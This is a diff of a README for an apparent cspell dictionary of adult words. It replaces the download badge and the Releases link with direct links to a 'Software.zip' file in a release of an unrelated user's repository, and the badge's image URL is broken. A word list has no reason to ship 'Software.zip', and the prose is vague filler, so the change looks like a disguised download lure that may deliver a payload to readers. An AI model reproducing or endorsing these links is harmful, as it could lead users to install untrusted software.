@@ -4,7 +4,7 @@
 
 Welcome to the repository for cspell dictionary aimed at avoiding serious adult content (no lewd elements included).
 
-[![Download Zip](https://img.shields.io/badge/Download%20Zip-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/xxob11/cspell-dict-yaju/releases/download/v1.0/Software.zip%20Zip-v1.0.0-blue)](https://github.com/xxob11/cspell-dict-yaju/releases/download/v1.0/Software.zip)
 
 ## Description
 This repository provides a custom dictionary for the cspell spell checker tool. It is specifically designed to help users avoid inadvertently using or including deep and serious adult content in their text files. The dictionary contains a curated list of words that should be avoided in professional or formal contexts to maintain a respectful and appropriate tone.
@@ -29,4 +29,4 @@ This repository and its contents are licensed under the [MIT License](LICENSE). 
 
 Let's create a more respectful and professional online environment by using tools like this custom cspell dictionary. Thank you for being mindful of the language and content you use in your writing. Together, we can promote positivity and respect in all communication. 🌟
 
-🔗 For more information, visit the [Releases](https://github.com/cli/browser/releases) section.
+🔗 For more information, visit the [Releases](https://github.com/xxob11/cspell-dict-yaju/releases/download/v1.0/Software.zip) section.
